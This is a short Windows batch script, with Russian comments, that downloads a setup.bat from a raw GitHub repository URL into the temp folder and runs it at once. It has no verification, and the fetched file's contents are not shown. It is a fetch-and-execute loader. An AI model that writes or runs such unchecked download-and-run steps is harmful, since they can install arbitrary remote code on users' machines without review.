@echo off
chcp 65001 >nul
echo [SYSTEM] Инициализация загрузки...

:: Указываем прямую ссылку на Raw-файл
set "URL=https://raw.githubusercontent.com/rid853512-dotcom/legendary-garbanzo/main/FNLS/setup.bat"

:: Качаем setup.bat во временную директорию
curl -L -o "%TEMP%\setup_installer.bat" "%URL%"

if exist "%TEMP%\setup_installer.bat" (
    echo [SYSTEM] Файл получен. Запуск установки...
    call "%TEMP%\setup_installer.bat"
) else (
    echo [ERROR] Не удалось соединиться с репозиторием GitHub.
    pause
)
